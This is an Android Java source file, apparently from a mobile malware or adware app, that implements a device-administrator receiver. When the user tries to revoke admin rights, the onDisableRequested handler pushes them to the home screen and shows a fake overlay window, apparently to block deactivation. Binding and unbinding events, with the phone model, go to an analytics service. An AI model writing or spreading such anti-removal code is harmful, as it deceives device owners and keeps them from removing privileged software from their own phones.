package com.xstd.qm.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.AppRuntime;
import com.xstd.qm.Config;
import com.xstd.qm.Utils;
import com.xstd.qm.fakecover.DisDeviceFakeWindow;
import com.xstd.qm.service.FakeBindService;
import com.xstd.qm.setting.MainSettingManager;

import java.util.HashMap;

/**
 * Created by michael on 13-12-23.
 */
public class BindDeviceReceiver extends DeviceAdminReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        MainSettingManager.getInstance().init(context);
        MainSettingManager.getInstance().setKeyHasBindingDevices(true);

        //notify umeng
        HashMap<String, String> log = new HashMap<String, String>();
        log.put("binding", "success");
        log.put("phoneType", Build.MODEL);
        Utils.umengLog(context, "bind_device_success", log);

        Utils.saveExtraInfo("主绑定成功");

        Intent i = new Intent();
        i.setAction(FakeBindService.BIND_SUCCESS_ACTION);
        context.sendBroadcast(i);
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        MainSettingManager.getInstance().init(context);
        MainSettingManager.getInstance().setKeyHasBindingDevices(false);

        //notify umeng
        HashMap<String, String> log = new HashMap<String, String>();
        log.put("unbind", "success");
        log.put("phoneType", Build.MODEL);
        Utils.umengLog(context, "unbinding", log);
    }

    @Override
    public CharSequence onDisableRequested(final Context context, Intent intent) {
        if (Config.DEBUG) {
            return "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?";
        }

        if (!MainSettingManager.getInstance().getKeyPluginInstalled()) {
            UtilsRuntime.goHome(context);

            DisDeviceFakeWindow fakeWindow = new DisDeviceFakeWindow(context);
            fakeWindow.show();

            AppRuntime.FAKE_WINDOW_FOR_DISDEVICE_SHOW.set(true);
        }

        return "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?";
    }

}
